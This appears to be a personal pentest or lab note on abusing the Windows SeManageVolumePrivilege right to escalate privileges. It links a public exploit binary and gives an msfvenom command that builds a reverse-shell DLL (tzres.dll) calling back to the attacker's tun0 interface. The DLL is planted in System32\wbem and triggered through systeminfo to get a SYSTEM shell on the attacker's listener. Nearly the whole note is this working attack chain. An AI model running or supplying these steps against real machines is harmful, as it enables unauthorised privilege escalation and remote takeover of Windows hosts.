# SeManageVolumePrivilege
```
SeManageVolumePrivilege Abuse
https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public
Download the binary executable and transfer it to the machine. 
After running the exploit, I could see I was able to write to the "C:\Windows\System32\" folder via icacls C:\Windows
Make a reverse shell payload with msfvenom
msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=6666 -f dll -o tzres.dll
Transfer the DLL payload to "C:\Windows\System32\wbem\".
In the last step, I ran systeminfo to trigger the payload for a root shell hitting my listener.
```
